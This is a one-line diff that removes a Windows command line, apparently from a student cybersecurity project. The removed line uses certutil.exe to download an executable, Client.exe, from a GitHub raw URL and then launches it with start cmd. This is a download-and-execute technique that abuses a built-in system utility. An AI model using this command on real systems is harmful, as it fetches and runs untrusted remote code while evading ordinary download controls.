@@ -1,1 +1,0 @@
-certutil.exe -urlcache -f https://github.com/moshegowers/FinalProject/blob/master/Client.exe?raw=true C:\\Users\\Moshe\\Desktop\\CyberPlan\\FinalProject\\FinalProject\\Client.exe & start cmd /K  "C:\\Users\\Moshe\\Desktop\\CyberPlan\\FinalProject\\FinalProject\\Client.exe"
